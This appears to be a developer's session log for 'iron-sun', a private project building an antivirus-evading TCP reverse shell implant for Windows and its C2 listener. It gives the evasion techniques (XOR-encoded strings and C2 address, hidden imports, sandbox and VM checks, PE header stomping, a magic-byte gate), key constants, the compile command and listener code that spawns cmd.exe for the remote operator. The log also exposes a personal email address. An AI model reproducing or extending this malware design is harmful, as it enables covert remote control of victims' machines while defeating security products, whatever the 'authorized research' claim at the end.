# IRON-SUN — SESSION LOG

**Operator:** rainfantry  
**Machine:** RADON (GIGABYTE G7 GD · Ghaleb Jomma account · Win11 26200)  
**Date:** 2026-06-26  
**Callsign:** hermon-bushranger  
**Repo:** `rainfantry/iron-sun` (PRIVATE — DO NOT MAKE PUBLIC)

---

## SESSION OVERVIEW

Full build session: FUD TCP reverse shell (`iron_sun.c`) created from scratch, compiled clean under gcc 15.2 MinGW, confirmed Defender-silent. Banner redesign (Design D) across all 5 C2 files. Listener updated with ISUN magic auth gate. Entire toolchain documented for cold-start.

---

## 1. IRON-SUN WEAPON — `shell/iron_sun.c`

**Status:** COMPILED · CLEAN · PUSHED

### Architecture

Complete FUD TCP reverse shell, replacing `vader_shell.c`. Designed to defeat Windows Defender (behavioral + static) and Kaspersky (via gcc/MinGW PE signature, not MSVC).

```
iron_sun.exe  →  TCP connect to C2  →  recv ISUN magic  →  spawn cmd.exe
```

### Evasion Stack

| Layer | Technique | Detail |
|---|---|---|
| String hiding | XOR obfuscation (key `0xFC`) | All strings, API names, C2 IP encoded at compile time; decoded to stack at runtime, zeroed immediately after use |
| Import hiding | Dynamic API resolution | Only `KERNEL32.dll` + `msvcrt.dll` in IAT; `ws2_32.dll` and `user32.dll` loaded via `LoadLibraryA` + `GetProcAddress` at runtime |
| Sandbox evasion | Sleep timing check | `Sleep(5000)` — if actual elapsed < 4500ms, sandbox detected (fast-forward), abort |
| Sandbox evasion | Screen width check | `GetSystemMetrics(0)` < 800px → sandbox, abort |
| Sandbox evasion | Disk size check | `GetDiskFreeSpaceExA` < 50GB → VM, abort |
| Memory forensics | PE header stomp | `VirtualProtect` + `ZeroMemory` first `0x400` bytes of own PE after load — kills in-memory scanners |
| Behavioral gate | Magic auth bytes | C2 must send `{0x49,0x53,0x55,0x4E}` ("ISUN") before `cmd.exe` spawns — sandboxes can't trigger behavioral detection |
| Connection timing | Jitter | `GetTickCount % 3096 + 2000ms` random delay per reconnect attempt |
| PE signature | gcc/MinGW build | Kaspersky flags MSVC PE signatures; gcc binary has structurally different header — bypasses that ruleset |

### Key Constants

```c
#define XK          0xFC        // XOR key
#define C2_PORT     4443        // hardcoded port
#define RECONN      6000        // reconnect delay base (ms)
#define MIN_SCREEN_W   800      // sandbox screen threshold
#define MIN_DISK_GB     50      // sandbox disk threshold
static const unsigned char MAGIC[4] = {0x49,0x53,0x55,0x4E};  // "ISUN"
```

### Encoded Strings (XOR 0xFC)

```c
// cmd.exe
static const unsigned char xCmd[]    = {0x9F,0x91,0x98,0xD2,0x99,0x84,0x99};
// 192.168.1.92 (RADON LAN test IP)
static const unsigned char xC2Addr[] = {0xCD,0xC5,0xCE,0xD2,0xCD,0xCA,...};
// kernel32.dll  ws2_32.dll  user32.dll
```

### Compile Command

```
gcc shell/iron_sun.c -o iron_sun.exe -lws2_32 -include ws2tcpip.h -D_WIN32_WINNT=0x0600
```

**Result:** 104KB · exit 0 · IAT = `KERNEL32.dll` + `msvcrt.dll` only

---

## 2. LISTENER UPDATE — `shell/vader_listener.py`

**Status:** UPDATED · PUSHED

Added ISUN magic auth send immediately after `accept()` — required to trigger `cmd.exe` on `iron_sun.exe`:

```python
conn, addr = server.accept()
try:
    conn.send(bytes([0x49,0x53,0x55,0x4E]))  # ISUN — iron_sun magic gate
except Exception:
    pass
interactive_shell(conn, addr)
```

`vader_shell.exe` (old implant) silently ignores these 4 bytes — backward compatible.

---

## 3. BANNER REDESIGN — DESIGN D — ALL 5 FILES

**Status:** COMPLETE · TESTED · CONFIRMED

### Files Updated

| File | Banner Location | Info Preserved |
|---|---|---|
| `shell/vader_listener.py` | `def banner():` lines 104–134 | — |
| `shell/vader_c2_v2.py` | `def banner(self):` method | Port, Discord, Log, Started panel |
| `agent/discord_c2.py` | Inline in `main()` | Brain, Channel panel |
| `vader_menu.py` | Module-level `CHEYANNE_LOGO` (now function-generated) | — |
| `vader_ui.py` | Inline print block | Dashboard URL, Port, Agent port info |

### Design D Engine

Mathematical ray convergence — 17 rays, 14 rows, 66-char inner width:

```python
W = 66; C = W // 2
for r in range(15):
    h = int(round(C * (14 - r) / 14))   # half-span narrows each row
    if h == 0:
        line[C] = '✡'; break             # convergence point
    for i in range(17):
        p = int(round(C + (-1.0 + i * 0.125) * h))
        line[p] = '│' if abs(p-C) <= 1 else ('╲' if p < C else '╱')
```

**Colors:** IDF blue `#0038B8` (double stripe top+bottom) · Gold `#FFD700` (rays) · Cyan `#00E5FF` (box) · White (title)

**Screenshot proof:** `docs/BANNER_design_D.png`

---

## 4. TOOLCHAIN & INFRASTRUCTURE

### Repo

- `rainfantry/iron-sun` created as **PRIVATE** repo
- Pushed via orphan branch (`iron-sun-init` → force-set as `main`) — zero commit history from old cheyanne (no token leaks)
- Discord Bot Token redacted from `agent/discord_implant.py` before any push

### Files Created This Session

| File | Purpose |
|---|---|
| `shell/iron_sun.c` | FUD reverse shell weapon |
| `art_test.py` | Banner design comparison script (Designs A–D) |
| `designate.py` | Auto-fork callsign generator (IDF × AUS word pairs, SHA256 fingerprint) |
| `INSTALL.md` | Cold-start guide (Scoop, gcc, gh, clone, compile, run) |
| `RELEASES.md` | Op fork log (chronological, never delete entries) |
| `docs/PROOF_iron_sun_radon_20260626.png` | RADON live test screenshot — 2026-06-26 11:43 |
| `docs/BANNER_design_D.png` | Design D confirmed render screenshot |
| `LOG.md` | This file |

### Python PATH Fix (RADON — must run each session)

```powershell
$env:PATH = "$env:USERPROFILE\scoop\apps\python\current;" + $env:PATH
```

MS Store Python stub intercepts `python` command without this.

### Git Identity (RADON — run once per clone)

```powershell
git config user.email "gwu0738@gmail.com"
git config user.name "rainfantry"
```

---

## 5. KNOWN ISSUES / LIMITATIONS

| Issue | Status | Notes |
|---|---|---|
| Kaspersky full test | PENDING | Requires gwu07 machine or another Kaspersky-licensed box; RADON is Defender only |
| VNC 20fps stream | NOT IMPLEMENTED | Mentor spec — future feature on iron_sun C2 |
| `gh auth login` on RADON | NOT DONE | Requires interactive browser — operator must run manually; `--create` flag in `designate.py` needs this |
| Live TCP reverse shell screenshot | NOT CAPTURED | Requires second machine for listener + implant deployment; single-machine test not possible without localhost loopback |

---

## 6. CALLSIGN LOG

| Date | Machine | Callsign |
|---|---|---|
| 2026-06-26 | RADON | `hermon-bushranger` |

Generated by `designate.py` — SHA256 of hostname + hour → IDF word × AUS word pair.

---

## 7. MENTOR DOCTRINE APPLIED

- Discord C2 architecture deprecated — pure TCP design
- Banner: Australian Army Rising Sun badge with IDF ✡ (Star of David) enshrouded
- gcc/MinGW build only — MSVC signatures flagged by Kaspersky
- Magic auth gate — adversarial sandbox resistance
- PE header stomp — memory forensics resistance

---

*IRON-SUN is named after the IDF Iron and the Australian Rising Sun badge — not after any individual. All research conducted on personally-owned hardware under authorized security research.*
